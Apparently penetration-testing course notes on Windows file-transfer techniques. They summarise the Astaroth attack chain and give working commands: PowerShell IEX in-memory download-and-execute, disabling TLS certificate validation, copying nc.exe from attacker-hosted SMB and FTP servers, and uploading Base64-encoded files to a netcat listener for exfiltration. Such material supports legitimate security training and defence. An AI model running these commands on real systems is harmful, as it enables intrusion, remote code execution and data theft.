# Windows File Transfer Methods

## Introduction

The Windows operating system has evolved significantly over the years, and modern versions include a wide range of built-in utilities that can be leveraged for file transfer operations. Understanding how file transfers work in Windows environments is valuable for both attackers and defenders.

* **Attackers** can use multiple file transfer techniques to operate stealthily and evade detection.
* **Defenders** can study these techniques to better monitor activity and implement policies that reduce the risk of compromise.

A good real-world example of this is the *Microsoft Astaroth Attack* blog post, which documents the behaviour of an advanced persistent threat (APT).

---

## The Astaroth Attack Overview

The blog post introduces the concept of **fileless threats**. While the term *fileless* implies that no files are written to disk, this does not mean that file transfer operations do not occur. Instead, files are often downloaded, decoded, and executed **directly in memory**.

The Astaroth attack followed these general steps:

1. A spear-phishing email contained a malicious LNK file.
2. When opened, the LNK file executed **WMIC** with the `/Format` parameter.
3. WMIC downloaded and executed malicious JavaScript code.
4. The JavaScript abused **Bitsadmin** to download additional payloads.
5. Payloads were **Base64-encoded** and decoded using **Certutil**, producing DLL files.
6. **Regsvr32** was used to load a DLL that decrypted and loaded further payloads.
7. The final payload was injected into the **Userinit** process.

This attack chain demonstrates how multiple native Windows tools can be abused for file transfer and execution while bypassing traditional defenses.

<img width="1597" height="1324" alt="fig1a-astaroth-attack-chain" src="https://github.com/user-attachments/assets/4676b30c-d117-4e04-bf12-40b242f20a2f" />

---

## Native Windows File Transfer Tools

This section focuses on using **built-in Windows utilities** for downloading and uploading files. Later in the module, we will explore *Living Off The Land Binaries (LOLBins)* on both Windows and Linux and how they can be used for file transfer operations.

<img width="757" height="299" alt="WIN-download-PwnBox" src="https://github.com/user-attachments/assets/210501e1-7b14-4c42-8cc6-a3121944edc9" />

---

## Download Operations

Assume we have access to a Windows target (`MS02`) and need to download files from our **Pwnbox**. Below are several techniques to achieve this.

---

## PowerShell Base64 Encode and Decode

For smaller files, it is possible to transfer data **without any network communication** by encoding the file as a Base64 string.

### Workflow

1. Encode the file as Base64 on the attack host.
2. Copy and paste the encoded string to the target.
3. Decode the string back into the original file.
4. Verify file integrity using an MD5 hash.

### Example: Encoding on Pwnbox

```bash
md5sum id_rsa
```

```bash
cat id_rsa | base64 -w 0
```

### Decoding on Windows

```powershell
[IO.File]::WriteAllBytes(
  "C:\Users\Public\id_rsa",
  [Convert]::FromBase64String("<BASE64_STRING>")
)
```

### Verifying Integrity

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

> **Note:**
>
> * `cmd.exe` has a maximum command length of **8,191 characters**.
> * Large Base64 strings may fail in constrained shells or web shells.

---

## PowerShell Web Downloads

Most corporate environments allow outbound HTTP and HTTPS traffic. PowerShell provides multiple methods to download files over these protocols.

### Net.WebClient Download Methods

| Method           | Description                        |
| ---------------- | ---------------------------------- |
| `DownloadFile`   | Downloads a file to disk           |
| `DownloadString` | Downloads data as a string         |
| `OpenRead`       | Returns a data stream              |
| Async variants   | Perform downloads without blocking |

### Example: DownloadFile

```powershell
(New-Object Net.WebClient).DownloadFile(
  "https://example.com/file.ps1",
  "C:\Users\Public\file.ps1"
)
```

---

## Fileless PowerShell Downloads

PowerShell can download and execute code **directly in memory**, a common technique in fileless attacks.

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://example.com/script.ps1")
```

Or using a pipeline:

```powershell
(New-Object Net.WebClient).DownloadString("https://example.com/script.ps1") | IEX
```

---

## Invoke-WebRequest

Available from PowerShell 3.0 onwards:

```powershell
Invoke-WebRequest https://example.com/file.ps1 -OutFile file.ps1
```

Aliases include `iwr`, `curl`, and `wget`.

### Common Errors

**Internet Explorer First-Run Issue**

```powershell
Invoke-WebRequest https://example.com/file.ps1 -UseBasicParsing
```


**SSL/TLS Certificate Errors**

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## SMB Downloads

SMB (TCP/445) is commonly allowed in enterprise networks.

### Create SMB Server on Pwnbox

```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support
```

### Copy File on Windows

```cmd
copy \\192.168.220.133\share\nc.exe
```

If guest access is blocked, use authentication:

```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support -user test -password test
```

```cmd
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

---

## FTP Downloads

FTP uses TCP ports **21** and **20**.

### Start FTP Server on Attack Host

```bash
sudo python3 -m pyftpdlib --port 21
```

### Download via PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile(
  "ftp://192.168.49.128/file.txt",
  "C:\Users\Public\file.txt"
)
```

### Non-Interactive FTP Download

```cmd
ftp -v -n -s:ftpcommand.txt
```

---

## Upload Operations

Uploading files is required for tasks such as **exfiltration, password cracking, and offline analysis**.

---

## Base64 Upload Using PowerShell

```powershell
[Convert]::ToBase64String(
  (Get-Content "C:\Windows\System32\drivers\etc\hosts" -Encoding Byte)
)
```

Decode on Linux:

```bash
base64 -d > hosts
```

Verify with `md5sum`.

---

## PowerShell Web Uploads

PowerShell does not natively support uploads, but this can be achieved using `Invoke-RestMethod`.

### Start Upload Server

```bash
pip3 install uploadserver
python3 -m uploadserver
```

### Upload Using PSUpload.ps1

```powershell
Invoke-FileUpload -Uri http://<IP>:8000/upload -File C:\path\to\file
```

---

## Base64 Upload via Netcat

```powershell
$b64 = [Convert]::ToBase64String(
  (Get-Content C:\path\file -Encoding Byte)
)
Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64
```

On attack host:

```bash
nc -lvnp 8000 | base64 -d > file
```
